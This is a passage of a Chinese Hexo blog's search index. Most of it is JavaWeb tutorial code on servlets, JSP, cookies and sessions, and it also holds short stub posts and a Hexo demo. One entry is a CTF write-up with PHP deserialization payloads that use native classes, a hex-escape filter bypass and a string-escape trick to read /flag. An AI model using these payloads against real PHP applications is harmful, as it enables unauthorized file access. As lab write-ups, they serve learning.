HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.存储到request域中</span><br>        req.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUserRequest&quot;</span>);<br>        req.setAttribute(<span class="hljs-string">&quot;status&quot;</span>,<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">//2.转发到el-demo.jps</span><br>        req.getRequestDispatcher(<span class="hljs-string">&quot;/el-demo.jsp-demo.jsp&quot;</span>).forward(req,resp);<br>    <br>        <span class="hljs-comment">//3.遍历粗存的举例</span><br>        List&lt;String&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        list.add(<span class="hljs-string">&quot;aaa&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;bbb&quot;</span>);<br>        list.add(<span class="hljs-string">&quot;ccc&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h5 id="jsp引用："><a href="#jsp引用：" class="headerlink" title="jsp引用："></a>jsp引用：</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ taglib prefix=<span class="hljs-string">&quot;c&quot;</span> uri=<span class="hljs-string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;<br><br>&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%--<span class="hljs-keyword">if</span>判断--%&gt;<br>    &lt;c:<span class="hljs-keyword">if</span> test=<span class="hljs-string">&quot;$&#123;status&#125; == 1&quot;</span>&gt;<br>        &lt;h1&gt;Test Successful&lt;/h1&gt;<br>    &lt;/c:<span class="hljs-keyword">if</span>&gt;<br>    &lt;c:<span class="hljs-keyword">if</span> test=<span class="hljs-string">&quot;$&#123;status&#125; == 0&quot;</span>&gt;<br>        &lt;h1&gt;Test fail&lt;/h1&gt;<br>    &lt;/c:<span class="hljs-keyword">if</span>&gt;<br>&lt;%--<span class="hljs-keyword">for</span>遍历--%&gt;<br>    &lt;c:forEach items=<span class="hljs-string">&quot;$&#123;list&#125;&quot;</span> <span class="hljs-keyword">var</span>=<span class="hljs-string">&quot;item&quot;</span>&gt;<br>        &lt;h1&gt;$&#123;item&#125;&lt;/h1&gt;<br>    &lt;/c:forEach&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="3、MVC模式和三层架构"><a href="#3、MVC模式和三层架构" class="headerlink" title="3、MVC模式和三层架构"></a>3、MVC模式和三层架构</h3><p><img src="/img/JavaWeb/1-1/MVC1.png"></p><p><img src="/img/JavaWeb/1-1/MVC2.png"></p><p><img src="/img/JavaWeb/1-1/MVC3.png"></p><h2 id="七、Cookie和Session"><a href="#七、Cookie和Session" class="headerlink" title="七、Cookie和Session"></a>七、Cookie和Session</h2><h3 id="1、Cookie"><a href="#1、Cookie" class="headerlink" title="1、Cookie"></a>1、Cookie</h3><h5 id="Cookie的概念："><a href="#Cookie的概念：" class="headerlink" title="Cookie的概念："></a>Cookie的概念：</h5><p>Cookie: 客户端会话技术，将数据保存到客户端，以后每次请求都携带Cookie数据进行访问。</p><p><img src="/img/JavaWeb/1-1/Cookie1.png"></p><p><img src="/img/JavaWeb/1-1/Cookie2.png"></p><h5 id="Cookie的使用："><a href="#Cookie的使用：" class="headerlink" title="Cookie的使用："></a>Cookie的使用：</h5><h5 id="储存："><a href="#储存：" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/aServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.创建Cookie对象</span><br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUser&quot;</span>);<br>        <span class="hljs-comment">//设置存活时间</span><br>        cookie.setMaxAge(<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//2.发送Cookie</span><br>        resp.addCookie(cookie);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取："><a href="#读取：" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/bServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Cookie数组</span><br>        Cookie[] cookies = req.getCookies();<br>        <span class="hljs-comment">//2.遍历数组</span><br>        <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> cookie.getName();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;username&quot;</span>.equals(name))&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cookie.getValue();<br>                System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + value);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="Cookie不能直接储存中文，要进行URL编码："><a href="#Cookie不能直接储存中文，要进行URL编码：" class="headerlink" title="Cookie不能直接储存中文，要进行URL编码："></a>Cookie不能直接储存中文，要进行URL编码：</h5><h5 id="储存：-1"><a href="#储存：-1" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/aServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.创建Cookie对象</span><br>        <span class="hljs-comment">//1-1.创建中文字符串</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;张三&quot;</span>;<br>        <span class="hljs-comment">//1-2.URL编码</span><br>        value = URLEncoder.encode(value, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;username&quot;</span>, value);<br>        <span class="hljs-comment">//设置存活时间</span><br>        cookie.setMaxAge(<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//2.发送Cookie</span><br>        resp.addCookie(cookie);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取：-1"><a href="#读取：-1" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/bServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Cookie数组</span><br>        Cookie[] cookies = req.getCookies();<br>        <span class="hljs-comment">//2.遍历数组</span><br>        <span class="hljs-keyword">for</span> (Cookie cookie : cookies) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> cookie.getName();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;username&quot;</span>.equals(name))&#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cookie.getValue();<br>                <span class="hljs-comment">//URL解码</span><br>                value = URLDecoder.decode(value, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>                System.out.println(name + <span class="hljs-string">&quot;:&quot;</span> + value);<br>            &#125;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-built_in">super</span>.doPost(req, resp);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2、Session"><a href="#2、Session" class="headerlink" title="2、Session"></a>2、Session</h3><h5 id="服务端会话跟踪技术，将数据保存到服务端"><a href="#服务端会话跟踪技术，将数据保存到服务端" class="headerlink" title="服务端会话跟踪技术，将数据保存到服务端"></a>服务端会话跟踪技术，将数据保存到服务端</h5><p><img src="/img/JavaWeb/1-1/Session1.png"></p><p>Session是基于Cookie实现</p><p><img src="/img/JavaWeb/1-1/Session2.png"></p><p><img src="/img/JavaWeb/1-1/Session3.png"></p><h5 id="基本用法："><a href="#基本用法：" class="headerlink" title="基本用法："></a>基本用法：</h5><h5 id="储存：-2"><a href="#储存：-2" class="headerlink" title="储存："></a>储存：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;SessionDemo1&quot;, value = &quot;/SessionDemo1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionDemo1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">//1.获取Session对象</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-comment">//2.存储对象</span><br>        session.setAttribute(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;NewUserSession&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="读取：-2"><a href="#读取：-2" class="headerlink" title="读取："></a>读取：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(name = &quot;SessionDemo2&quot;, value = &quot;/SessionDemo2&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionDemo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;username&quot;</span>);<br>        System.out.println(username);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb学习</title>
    <link href="/2023/05/02/JavaWeb_Start/"/>
    <url>/2023/05/02/JavaWeb_Start/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb学习"><a href="#JavaWeb学习" class="headerlink" title="JavaWeb学习"></a>JavaWeb学习</h1><h2 id="我们将在此之后学习并更新Java-Web方面的相关内容，包括Java的基本开发框架。"><a href="#我们将在此之后学习并更新Java-Web方面的相关内容，包括Java的基本开发框架。" class="headerlink" title="我们将在此之后学习并更新Java Web方面的相关内容，包括Java的基本开发框架。"></a>我们将在此之后学习并更新Java Web方面的相关内容，包括Java的基本开发框架。</h2>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF周报-2223Q2-Week10</title>
    <link href="/2023/04/28/CTF-2223Q2-Week10/"/>
    <url>/2023/04/28/CTF-2223Q2-Week10/</url>
    
    <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="一、POP"><a href="#一、POP" class="headerlink" title="一、POP"></a>一、POP</h2><h3 id="1、prize-p5（16进制绕过-字符串逃逸）"><a href="#1、prize-p5（16进制绕过-字符串逃逸）" class="headerlink" title="1、prize_p5（16进制绕过/字符串逃逸）"></a>1、prize_p5（16进制绕过/字符串逃逸）</h3><p>本题可以从$_GET[‘cata’]，开始构架POP链，同时要绕过下面的正则匹配。其中下面这个语句可以直接使用php的原生类，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span>($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">data</span>);</span><br></code></pre></td></tr></table></figure><p>然后我们首先要知道flag位置，查找有f的文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;GlobIterator&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;/*f*&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>看到了就叫flag</p><p>由于后面有过滤object，但是可以使用原生类SplFileObject，来获取flag，看了一下方法，需要使用16进制绕过去</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?cata=O:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;catalogue&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;class&quot;</span>;S:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;SplFile\4fbject&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;data&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;/flag&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>还可以使用字符串逃逸</p><p>原理：1、定义一个abscond方法，就是进行替换的，这个方法本没有错，错的是，可以替换成不同的长度；2、这里举个列，假如我们传进去的是NSSaaa，那么他经过转换就直接接收了hacker，然后aaa就逃出去了；3、然后他对email参数转进来的东西，进行了过滤，所以我们不能用，因为我们要传flag，然后就是phone,if(is_array($escape[‘phone’]))这里判断他必须是一个数组，所以我们要改，最后就是在name中传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">escape</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$phone</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;/flag&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">escape</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br> <br><span class="hljs-comment">//O:6:&quot;escape&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br><span class="hljs-comment">//&quot;;s:5:&quot;phone&quot;;a:1:&#123;i:0;i:1;&#125;s:5:&quot;email&quot;;s:5:&quot;/flag&quot;;&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>寝室打扫卫生查人系统</title>
    <link href="/2023/04/27/CleanRoomProject/"/>
    <url>/2023/04/27/CleanRoomProject/</url>
    
    <content type="html"><![CDATA[<h1 id="寝室打扫卫生查人系统"><a href="#寝室打扫卫生查人系统" class="headerlink" title="寝室打扫卫生查人系统"></a>寝室打扫卫生查人系统</h1><h2 id="本系统包含一个弹出式窗口，请查看弹出式窗口。"><a href="#本系统包含一个弹出式窗口，请查看弹出式窗口。" class="headerlink" title="本系统包含一个弹出式窗口，请查看弹出式窗口。"></a>本系统包含一个弹出式窗口，请查看弹出式窗口。</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo演示文稿</title>
    <link href="/2023/04/14/0-HexoDemo/"/>
    <url>/2023/04/14/0-HexoDemo/</url>
    
    <content type="html"><![CDATA[<h1 id="Hexo演示文稿"><a href="#Hexo演示文稿" class="headerlink" title="Hexo演示文稿"></a>Hexo演示文稿</h1><h2 id="一、本文稿用于测试和学习Hexo的相关知识"><a href="#一、本文稿用于测试和学习Hexo的相关知识" class="headerlink" title="一、本文稿用于测试和学习Hexo的相关知识"></a>一、本文稿用于测试和学习Hexo的相关知识</h2><p>​为了更好的学习Hexo相关的内容，我们创建了此文稿并实现一些功能。为之后的Hexo文档编写做好准备。</p><h2 id="二、代码行演示（常用的Hexo命令）"><a href="#二、代码行演示（常用的Hexo命令）" class="headerlink" title="二、代码行演示（常用的Hexo命令）"></a>二、代码行演示（常用的Hexo命令）</h2><h3 id="1、清除之前生成的代码（先cd进入博客目录）"><a href="#1、清除之前生成的代码（先cd进入博客目录）" class="headerlink" title="1、清除之前生成的代码（先cd进入博客目录）"></a>1、清除之前生成的代码（先cd进入博客目录）</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br></code></pre></td></tr></table></figure><h3 id="2、生成新的网站"><a href="#2、生成新的网站" class="headerlink" title="2、生成新的网站"></a>2、生成新的网站</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br></code></pre></td></tr></table></figure><h3 id="3-1、启动本地端口"><a href="#3-1、启动本地端口" class="headerlink" title="3-1、启动本地端口"></a>3-1、启动本地端口</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><h3 id="3-2、上传到GitHub"><a href="#3-2、上传到GitHub" class="headerlink" title="3-2、上传到GitHub"></a>3-2、上传到GitHub</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><p>相关配置文章：</p><p>1、<a href="https://hexo.io/zh-cn/docs/front-matter">https://hexo.io/zh-cn/docs/front-matter</a></p><p>2、<a href="https://hexo.fluid-dev.com/docs/guide/">https://hexo.fluid-dev.com/docs/guide/</a></p><p>3、<a href="https://zhuanlan.zhihu.com/p/547520780?utm_id=0">https://zhuanlan.zhihu.com/p/547520780?utm_id=0</a></p><h2 id="三、图片演示"><a href="#三、图片演示" class="headerlink" title="三、图片演示"></a>三、图片演示</h2><h3 id="1、来自于Hexo内部文件夹"><a href="#1、来自于Hexo内部文件夹" class="headerlink" title="1、来自于Hexo内部文件夹"></a>1、来自于Hexo内部文件夹</h3><p><img src="/img/testphoto.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Hexo</category>
      
      <category>Web</category>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
